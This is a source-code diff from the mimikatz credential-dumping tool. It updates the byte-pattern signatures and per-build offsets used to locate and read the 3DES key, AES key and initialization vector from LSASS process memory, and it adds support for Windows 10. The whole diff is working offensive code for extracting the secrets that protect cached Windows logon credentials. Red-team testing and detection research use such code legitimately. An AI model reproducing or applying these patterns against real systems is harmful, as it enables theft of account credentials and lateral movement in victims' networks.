@@ -1,33 +1,29 @@
 /*	Benjamin DELPY `gentilkiwi`
 	http://blog.gentilkiwi.com
 	benjamin@gentilkiwi.com
-	Licence : http://creativecommons.org/licenses/by/3.0/fr/
+	Licence : https://creativecommons.org/licenses/by/4.0/
 */
 #include "kuhl_m_sekurlsa_nt6.h"
 
 #ifdef _M_X64
 BYTE PTRN_WNO8_LsaInitializeProtectedMemory_KEY[]	= {0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4c, 0x24, 0x48, 0x48, 0x8b, 0x0d};
-LONG OFFS_WNO8_hAesKey								= 25;
-LONG OFFS_WN61_h3DesKey								= -61;
-LONG OFFS_WN61_InitializationVector					= 59;
-LONG OFFS_WN60_h3DesKey								= -69;
-LONG OFFS_WN60_InitializationVector					= 63;
-
 BYTE PTRN_WIN8_LsaInitializeProtectedMemory_KEY[]	= {0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8b, 0x0d};
-LONG OFFS_WIN8_hAesKey								= 23;
-LONG OFFS_WIN8_h3DesKey								= -70;
-LONG OFFS_WIN8_InitializationVector					= 62;
+BYTE PTRN_WN10_LsaInitializeProtectedMemory_KEY[]	= {0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15};
+KULL_M_PATCH_GENERIC PTRN_WIN8_LsaInitializeProtectedMemory_KeyRef[] = { // InitializationVector, h3DesKey, hAesKey
+	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY),	PTRN_WNO8_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {63, -69, 25}},
+	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY),	PTRN_WNO8_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {59, -61, 25}},
+	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY),	PTRN_WIN8_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {62, -70, 23}},
+	{KULL_M_WIN_BUILD_10,		{sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY),	PTRN_WN10_LsaInitializeProtectedMemory_KEY},{0, NULL}, {61, -73, 16}},
+};
 #elif defined _M_IX86
-BYTE PTRN_WNO8_LsaInitializeProtectedMemory_KEY[]	= {0x8b, 0xf0, 0x3b, 0xf3, 0x7c, 0x2c, 0x6a, 0x02, 0x6a, 0x10, 0x68};
-LONG OFFS_WNO8_hAesKey								= -15;
-LONG OFFS_WNO8_h3DesKey								= -70;
-LONG OFFS_WNO8_InitializationVector					= 11;
+BYTE PTRN_WALL_LsaInitializeProtectedMemory_KEY[]	= {0x6a, 0x02, 0x6a, 0x10, 0x68};
+KULL_M_PATCH_GENERIC PTRN_WIN8_LsaInitializeProtectedMemory_KeyRef[] = { // InitializationVector, h3DesKey, hAesKey
+	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WALL_LsaInitializeProtectedMemory_KEY),	PTRN_WALL_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {5, -76, -21}},
+	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WALL_LsaInitializeProtectedMemory_KEY),	PTRN_WALL_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {5, -69, -18}},
+	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WALL_LsaInitializeProtectedMemory_KEY),	PTRN_WALL_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {5, -79, -22}}, // post 11/11
+	{KULL_M_WIN_BUILD_10,		{sizeof(PTRN_WALL_LsaInitializeProtectedMemory_KEY),	PTRN_WALL_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {5, -79, -22}},
+};
 
-BYTE PTRN_WIN8_LsaInitializeProtectedMemory_KEY[]	= {0x8b, 0xf0, 0x85, 0xf6, 0x78, 0x2a, 0x6a, 0x02, 0x6a, 0x10, 0x68};
-BYTE PTRN_WIN81_LsaInitializeProtectedMemory_KEY[]	= {0x8b, 0xf0, 0x85, 0xf6, 0x78, 0x2c, 0x6a, 0x02, 0x6a, 0x10, 0x68};
-LONG OFFS_WIN8_hAesKey								= -12;
-LONG OFFS_WIN8_h3DesKey								= -63;
-LONG OFFS_WIN8_InitializationVector					= 11;
 #endif
 
 HMODULE kuhl_m_sekurlsa_nt6_hBCrypt = NULL;
@@ -168,56 +164,13 @@ NTSTATUS kuhl_m_sekurlsa_nt6_acquireKeys(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKULL_
 #ifdef _M_X64
 	LONG offset64;
 #endif
-	PBYTE PTRN_WNT6_LsaInitializeProtectedMemory_KEY;
-	ULONG SIZE_PTRN_WNT6_LsaInitializeProtectedMemory_KEY;
-	LONG OFFS_WNT6_hAesKey, OFFS_WNT6_h3DesKey, OFFS_WNT6_InitializationVector;
-	
-	if(cLsass->osContext.MinorVersion < 2)
+	PKULL_M_PATCH_GENERIC currentReference;
+	if(currentReference = kull_m_patch_getGenericFromBuild(PTRN_WIN8_LsaInitializeProtectedMemory_KeyRef, ARRAYSIZE(PTRN_WIN8_LsaInitializeProtectedMemory_KeyRef), cLsass->osContext.BuildNumber))
 	{
-		PTRN_WNT6_LsaInitializeProtectedMemory_KEY = PTRN_WNO8_LsaInitializeProtectedMemory_KEY;
-		SIZE_PTRN_WNT6_LsaInitializeProtectedMemory_KEY = sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY);
-		OFFS_WNT6_hAesKey = OFFS_WNO8_hAesKey;
-#ifdef _M_X64
-		if(cLsass->osContext.MinorVersion < 1)
-		{
-			OFFS_WNT6_h3DesKey = OFFS_WN60_h3DesKey;
-			OFFS_WNT6_InitializationVector = OFFS_WN60_InitializationVector;
-		}
-		else
-		{
-			OFFS_WNT6_h3DesKey = OFFS_WN61_h3DesKey;
-			OFFS_WNT6_InitializationVector = OFFS_WN61_InitializationVector;
-		}
-#elif defined _M_IX86
-		OFFS_WNT6_h3DesKey = OFFS_WNO8_h3DesKey;
-		OFFS_WNT6_InitializationVector = OFFS_WNO8_InitializationVector;
-#endif
-	}
-	else
+		aLocalMemory.address = currentReference->Search.Pattern;
+		if(kull_m_memory_search(&aLocalMemory, currentReference->Search.Length, &sMemory, FALSE))
 	{
-		OFFS_WNT6_hAesKey = OFFS_WIN8_hAesKey;
-		OFFS_WNT6_h3DesKey = OFFS_WIN8_h3DesKey;
-		OFFS_WNT6_InitializationVector = OFFS_WIN8_InitializationVector;
-#if defined _M_IX86
-		if(cLsass->osContext.MinorVersion < 3)
-		{
-#endif
-			PTRN_WNT6_LsaInitializeProtectedMemory_KEY = PTRN_WIN8_LsaInitializeProtectedMemory_KEY;
-			SIZE_PTRN_WNT6_LsaInitializeProtectedMemory_KEY = sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY);
-#if defined _M_IX86
-		}
-		else
-		{
-			PTRN_WNT6_LsaInitializeProtectedMemory_KEY = PTRN_WIN81_LsaInitializeProtectedMemory_KEY;
-			SIZE_PTRN_WNT6_LsaInitializeProtectedMemory_KEY = sizeof(PTRN_WIN81_LsaInitializeProtectedMemory_KEY);
-		}
-#endif
-	}
-
-	aLocalMemory.address = PTRN_WNT6_LsaInitializeProtectedMemory_KEY;
-	if(kull_m_memory_search(&aLocalMemory, SIZE_PTRN_WNT6_LsaInitializeProtectedMemory_KEY, &sMemory, FALSE))
-	{
-		aLsassMemory.address = (PBYTE) sMemory.result + OFFS_WNT6_InitializationVector;
+		aLsassMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off0;
 #ifdef _M_X64
 		aLocalMemory.address = &offset64;
 		if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(LONG)))
@@ -231,15 +184,16 @@ NTSTATUS kuhl_m_sekurlsa_nt6_acquireKeys(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKULL_
 			aLocalMemory.address = InitializationVector;
 			if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(InitializationVector)))
 			{
-				aLsassMemory.address = (PBYTE) sMemory.result + OFFS_WNT6_h3DesKey;
+				aLsassMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off1;
 				if(kuhl_m_sekurlsa_nt6_acquireKey(&aLsassMemory, &cLsass->osContext, &k3Des))
 				{
-					aLsassMemory.address = (PBYTE) sMemory.result + OFFS_WNT6_hAesKey;
+					aLsassMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off2;
 					if(kuhl_m_sekurlsa_nt6_acquireKey(&aLsassMemory, &cLsass->osContext, &kAes))
 						status = STATUS_SUCCESS;
 				}
 			}
 		}
+	}
 	}
 	return status;
 }
@@ -252,12 +206,12 @@ BOOL kuhl_m_sekurlsa_nt6_acquireKey(PKULL_M_MEMORY_ADDRESS aLsassMemory, PKUHL_M
 	KIWI_BCRYPT_HANDLE_KEY hKey; PKIWI_HARD_KEY pHardKey;
 	PVOID buffer; SIZE_T taille; LONG offset;
 
-	if(pOs->MinorVersion < 2)
+	if(pOs->BuildNumber < KULL_M_WIN_MIN_BUILD_8)
 	{
 		taille = sizeof(KIWI_BCRYPT_KEY);
 		offset = FIELD_OFFSET(KIWI_BCRYPT_KEY, hardkey);
 	}
-	else if(pOs->MinorVersion < 3)
+	else if(pOs->BuildNumber < KULL_M_WIN_MIN_BUILD_BLUE)
 	{
 		taille = sizeof(KIWI_BCRYPT_KEY8);
 		offset = FIELD_OFFSET(KIWI_BCRYPT_KEY8, hardkey);
